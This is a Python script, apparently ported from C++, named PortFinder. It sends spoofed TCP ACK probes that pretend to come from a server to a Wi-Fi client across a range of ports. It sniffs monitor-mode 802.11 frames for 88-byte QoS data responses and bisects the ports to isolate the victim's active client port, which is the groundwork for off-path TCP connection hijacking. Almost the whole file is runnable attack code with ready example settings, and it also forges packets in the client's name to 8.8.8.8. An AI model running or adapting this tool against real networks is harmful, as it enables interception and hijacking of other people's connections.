#!/usr/bin/env python3
"""
PortFinder

Behavior:
- Iterates through a client-port range [start_port, end_port) in steps (step_size).
- For each port in a batch, sends 2 TCP ACK probes (seq=1 and seq=2^31+1) from server->client.
- Sniffs Wi-Fi frames briefly; if a Dot11QoS + Raw payload of exactly 88 bytes is seen => "hit".
- On hit, bisects the suspicious port list until a single client port is isolated.
- Uses a candidate deque to re-check suspected lists after repeat_time seconds.

Requires:
  pip install scapy
Run:
  sudo python3 port_finder.py
"""

from __future__ import annotations

import time
import threading
import random
from dataclasses import dataclass
from collections import deque
from typing import Deque, List, Optional

from scapy.all import sniff, send, IP, TCP, Raw

try:
    from scapy.layers.dot11 import Dot11, Dot11QoS  # type: ignore
except Exception:  # pragma: no cover
    Dot11 = None
    Dot11QoS = None


@dataclass
class Candidate:
    port_list: List[int]
    time_added: float  # epoch seconds


class PortFinder:
    def __init__(
        self,
        client_ip: str = "",
        server_ip: str = "",
        server_port: int = 0,
        start_port: int = 0,
        end_port: int = 0,
        send_if_name: str = "",
        sniff_if_name: Optional[List[str]] = None,
        client_mac: str = "",
        step_size: int = 1,
        packet_repeat: int = 1,
    ):
        self.client_mac = client_mac
        self.client_ip = client_ip
        self.server_ip = server_ip
        self.client_port = 0  # unused in the C++ logic (kept for parity)
        self.server_port = int(server_port)
        self.start_port = int(start_port)
        self.current_port = int(start_port)
        self.end_port = int(end_port)
        self.send_if_name = send_if_name
        self.sniff_if_name = sniff_if_name or []
        self.step_size = int(step_size)
        self.packet_repeat = int(packet_repeat)

        self.repeat_time = 2  # seconds
        self.target_frame_num = 0
        self.stop = False
        self.port_range_end = False
        self.candidate_deque: Deque[Candidate] = deque()

        self.send_num = 0
        self.send_byte = 0
        self.cost_time = 0.0
        self.send_rate = 0.0
        self.result = -1

        self.max_uint32 = 0xFFFFFFFF
        self.max_uint32_half = self.max_uint32 >> 1
        self.random_ack = 0

    # --------------------------
    # Sniffing / packet handling
    # --------------------------
    def capture_packets(self, out_pkts: List, sniff_if_index: int) -> None:
        """
        C++:
          filter: "wlan addr1 " + client_mac
          sniff for 100ms using sniffer.next_packet()
        Scapy:
          sniff(timeout=0.1), store packets.
        """
        iface = self.sniff_if_name[sniff_if_index]
        bpf = f"wlan addr1 {self.client_mac}"

        # Fallback python-side filter if BPF isn't supported
        def lfilter(pkt) -> bool:
            if Dot11 is None or not pkt.haslayer(Dot11):
                return False
            d11 = pkt.getlayer(Dot11)
            # addr1 is receiver address in 802.11
            return hasattr(d11, "addr1") and (d11.addr1 or "").lower() == self.client_mac.lower()

        try:
            pkts = sniff(iface=iface, timeout=0.10, store=True, filter=bpf)
        except Exception:
            pkts = sniff(iface=iface, timeout=0.10, store=True, lfilter=lfilter)

        out_pkts.extend(pkts)

    def handle_packets(self, pkts: List) -> None:
        """
        C++:
          if Dot11QoSData present and RawPDU present and RawPDU.size()==88 => hit
        """
        self.target_frame_num = 0

        if Dot11QoS is None:
            return

        for pkt in pkts:
            try:
                if pkt.haslayer(Dot11QoS) and pkt.haslayer(Raw):
                    raw_layer = pkt.getlayer(Raw)
                    raw_load = bytes(getattr(raw_layer, "load", b""))
                    if len(raw_load) == 88:
                        self.target_frame_num += 1
                        return
            except Exception:
                continue

    # --------------------------
    # Probe sending + checking
    # --------------------------
    def check_port_list(self, port_list: List[int]) -> None:
        if not port_list:
            self.target_frame_num = 0
            print("[*] Warning: the port list is empty")
            return

        send_list = []
        for p in port_list:
            p = int(p)
            for _ in range(self.packet_repeat):
                # packet_1: seq = 1
                pkt1 = (
                    IP(src=self.server_ip, dst=self.client_ip)
                    / TCP(sport=self.server_port, dport=p, flags="A", seq=1, ack=self.random_ack)
                    / Raw(b"AAA")
                )

                # packet_2: seq = (1<<31)+1
                pkt2 = (
                    IP(src=self.server_ip, dst=self.client_ip)
                    / TCP(
                        sport=self.server_port,
                        dport=p,
                        flags="A",
                        seq=((1 << 31) + 1),
                        ack=self.random_ack,  # (C++ had a typo setting ack on tcp_1 again; we keep intended behavior)
                    )
                    / Raw(b"AAA")
                )

                send_list.append(pkt1)
                send_list.append(pkt2)

        self.send_num += len(send_list)
        self.send_byte += sum(len(bytes(pkt)) for pkt in send_list)

        # Start sniff threads
        sniff_pkts_vec: List[List] = [[] for _ in self.sniff_if_name]
        threads: List[threading.Thread] = []
        for i in range(len(self.sniff_if_name)):
            t = threading.Thread(target=self.capture_packets, args=(sniff_pkts_vec[i], i), daemon=True)
            threads.append(t)
            t.start()

        time.sleep(0.005)  # 5ms like C++

        # Send probes
        for pkt in send_list:
            send(pkt, iface=self.send_if_name, verbose=False)

        time.sleep(0.10)  # 100ms like C++

        # Avoid long sniffing time due to loss of probe packets/responses (mirror C++)
        add_ip = "8.8.8.8"
        add_pkt = (
            IP(src=self.client_ip, dst=add_ip)
            / TCP(sport=1234, dport=4321, flags="A", seq=0, ack=0)
            / Raw(b"AAAAA")
        )
        for _ in range(4):
            send(add_pkt, iface=self.send_if_name, verbose=False)

        for t in threads:
            t.join(timeout=1.0)

        merged = []
        for v in sniff_pkts_vec:
            merged.extend(v)

        self.handle_packets(merged)

    # --------------------------
    # Main search logic
    # --------------------------
    def find_port(self) -> None:
        print("++++++++++ Try to find the connection port ++++++++++")

        while not self.stop:
            port_list: List[int] = []

            if not self.candidate_deque and self.port_range_end:
                self.stop = True
                break

            # Re-check candidates after repeat_time
            if self.candidate_deque:
                candidate = self.candidate_deque[0]
                if (time.time() - candidate.time_added) > self.repeat_time:
                    port_list = candidate.port_list
                    self.candidate_deque.popleft()
                    print(f"[+] Check the candidate list again and the candidate queue length is {len(self.candidate_deque)}")

            # If no candidate to re-check, scan next batch
            if not port_list:
                s_p = self.current_port
                if (self.end_port - self.current_port) <= self.step_size:
                    e_p = self.end_port
                else:
                    e_p = self.current_port + self.step_size

                self.current_port = e_p
                if self.current_port >= self.end_port:
                    self.port_range_end = True

                # C++: for p = s_p; p < e_p; ++p
                port_list = list(range(s_p, e_p))

            if not port_list:
                continue

            self.check_port_list(port_list)

            if self.target_frame_num <= 0:
                continue

            print("[+] Find a suspicious port range")

            suspicious_port_list = list(port_list)
            sus_list_len = len(suspicious_port_list)
            mid = sus_list_len // 2

            list_start_len = len(port_list)
            list_end_len = list_start_len

            candidate_list: List[int] = []
            suspicious_left = suspicious_port_list[:mid]
            suspicious_right = suspicious_port_list[mid:]
            double_port = 0

            while sus_list_len > 1:
                list_end_len = len(suspicious_port_list)
                print(f"[+] Suspicious port range length {list_end_len}")

                candidate_list = list(suspicious_port_list)
                suspicious_port_list = []

                self.check_port_list(suspicious_left)
                if self.target_frame_num > 0:
                    suspicious_port_list.extend(suspicious_left)

                self.check_port_list(suspicious_right)
                if self.target_frame_num > 0:
                    suspicious_port_list.extend(suspicious_right)

                sus_list_len = len(suspicious_port_list)
                mid = sus_list_len // 2
                suspicious_left = suspicious_port_list[:mid]
                suspicious_right = suspicious_port_list[mid:]

                # Same (slightly odd) C++ logic
                if sus_list_len == list_end_len:
                    if double_port >= 5:
                        suspicious_left = []
                        double_port = 0
                        print("[#] This port range include two client port")
                    # (C++ never increments double_port; keep behavior identical)

            if sus_list_len == 1:
                self.result = int(suspicious_port_list[0])
                print(f"[+] Find the client port: {self.result}")
                self.stop = True
            else:
                if list_end_len < list_start_len:
                    self.candidate_deque.append(Candidate(candidate_list, time.time()))
                    print(f"[+] Add a candidate, the candidate queue length is {len(self.candidate_deque)}")
                else:
                    print("[-] Not the real port range")

    # --------------------------
    # Public API
    # --------------------------
    def run(self) -> None:
        time_start = time.time()

        self.current_port = self.start_port
        self.stop = False
        self.port_range_end = False
        self.candidate_deque.clear()

        self.send_num = 0
        self.send_byte = 0
        self.cost_time = 0.0
        self.result = -1

        self.random_ack = random.randint(0, self.max_uint32)

        self.find_port()

        time_end = time.time()
        self.cost_time = float(time_end - time_start)
        self.send_rate = (float(self.send_byte) / self.cost_time) if self.cost_time > 0 else 0.0

        print(f"Find the client port: {self.result}")
        print(f"Send Packets: {self.send_num}")
        print(f"Send Bytes: {self.send_byte} (Bytes)")
        print(f"Cost Time: {self.cost_time} (s)")
        print(f"Send Rate: {self.send_rate} (Byte/s)")

    def get_result(self) -> int:
        return int(self.result)

    def write_data(self, path: str = "port_data.txt") -> None:
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"{self.cost_time} {self.send_rate} {self.send_byte} {self.send_num}\n")


# Example usage (edit to match your setup)
if __name__ == "__main__":
    pf = PortFinder(
        client_ip="10.0.0.2",
        server_ip="10.0.0.1",
        server_port=80,
        start_port=10000,
        end_port=11000,
        send_if_name="eth0",
        sniff_if_name=["wlan0mon"],
        client_mac="aa:bb:cc:dd:ee:ff",
        step_size=50,
        packet_repeat=1,
    )
    pf.run()
    pf.write_data()
